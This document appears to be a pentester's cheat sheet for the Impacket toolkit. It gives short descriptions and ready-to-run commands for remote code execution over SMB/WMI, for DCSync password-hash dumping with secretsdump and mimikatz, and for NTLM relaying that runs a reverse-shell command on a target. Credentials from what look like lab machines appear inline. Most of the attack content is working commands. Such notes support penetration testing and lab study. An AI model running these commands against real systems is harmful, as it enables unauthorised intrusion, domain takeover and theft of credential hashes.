Impacket is a *collection of Python classes* for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself.

Packets can be constructed from scratch, as well as parsed from raw data, and the object-oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.

---
# RCE
With :-
- atexec.py
- psexec.py
- smbexec.py
- wmiexec.py
https://www.hackingarticles.in/remote-code-execution-using-impacket/

```sh
impacket-psexec 'pentest:P3nT3st!@10.10.10.152'
impacket-smbexec 'ignite/administrator:Ignite@987@192.168.1.105'
impacket-wmiexec 'ignite/administrator:Ignite@987@192.168.1.105' dir
python atexec.py ignite/administrator:Ignite@987@192.168.1.105 systeminfo
```

---
# Retrieve Password hashes (DCSync Attack)
If any user has a unique permission that *allows all Active Directory changes to be synced with that user account*, it will include **Password Hashes** too!
![[Pasted image 20230711000201.png]]

Knowing this, we can use another tool within `Impacket` called **secretsdump.py**. This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer.

```sh
impacket-secretsdump 'spookysec.local/backup:backup2517860@10.10.141.46'

# Get hash of only one user
impacket-secretsdump -just-dc-user [user] corp.com/jeffadmin:'BrouhahaTungPerorateBroom2023!'@192.168.50.70

# Locally
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL -outputfile hashes

# Using mimikatz
lsadump::dcsync /user:corp\Administrator
```

---
# NTLMv2 Relaying
Get NTLMv2 hash of a local administrator on one machine and use it on another machine.

```sh
impacket-ntlmrelayx --no-http-server -smb2support -t [Target_IP] -c "powershell_reverse_shell command"
```
